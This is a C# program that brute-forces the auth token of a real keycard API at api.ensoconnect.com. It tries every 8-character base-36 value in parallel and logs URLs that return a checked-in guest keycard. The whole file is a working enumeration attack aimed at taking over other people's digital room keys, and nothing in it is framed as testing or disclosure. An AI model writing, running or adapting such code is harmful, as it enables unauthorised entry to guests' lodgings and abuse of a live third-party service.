using System.Net;
using System.Text;
using System.Net.Http.Json;
using System.Text.Json;

namespace M11;

public class Program
{
    public static string BaseQueryParameter = "?auth=";
    public static string BaseAddress = "https://api.ensoconnect.com/prod/keycard";
    public static string FilePath = "results.cs.txt";

    public static long Size = 2_821_109_907_456;

    public static int Main(string[] args)
    {
        CreateFile(FilePath);

        Parallel.For(0, Size,
            (j) =>
            {
                using var client = new HttpClient();
                client.BaseAddress = new Uri(BaseAddress);

                var queryValue = ConvertToBase36(j);

                var queryParameter = GetQueryParameter(queryValue);
                var url = $"{BaseAddress}{queryParameter}";

                var response = client.GetAsync(queryParameter).GetAwaiter().GetResult();

                if (response.StatusCode != HttpStatusCode.OK)
                {
                    Console.WriteLine($"Finished executing {url}");

                    return;
                }

                var body = response.Content.ReadAsStringAsync().GetAwaiter().GetResult();
                var keyCard = JsonSerializer.Deserialize<KeyCard>(body);

                if (keyCard is null || keyCard.View != "checked_in") {
                    Console.WriteLine($"Finished executing {url}");

                    return;
                }

                Console.WriteLine($"{url} is good! And value is {keyCard.View}");
                File.AppendAllText(FilePath, $"{url}\n");
            });

        return 0;
    }

    private static string GetQueryParameter(string input)
    {
        return $"{BaseQueryParameter}{input}";
    }

    private static void CreateFile(string path)
    {
        if (File.Exists(path))
        {
            return;
        }

        File.Open(path, FileMode.Create);
    }

    private static string ConvertToBase36(long input)
    {
        var i = 7;
        var sb = new StringBuilder();
        var remaining = input;
        var remainder = 0L;

        while (i >= 0 && remaining > 0)
        {
            remainder = remaining % 36;
            remaining = remaining / 36;

            if (remainder >= 10)
            {
                char ch = ConvertNumberToLowerCaseCharacter(remainder);
                sb.Append(ch);
            }
            else
            {
                sb.Append(remainder);
            }

            i -= 1;
        }

        var length = sb.Length;

        for (i = length; i < 8; i += 1)
        {
            sb.Append(0);
        }

        var result = sb.ToString();
        var charArray = result.ToCharArray();
        Array.Reverse(charArray);

        var reversedResult = new string(charArray);

        return reversedResult;
    }

    private static char ConvertNumberToLowerCaseCharacter(long input)
    {
        // a is 97
        // but input starts @ 10
        // So 10 will be 'a' or 97
        return (char)(input + 87);
    }
}
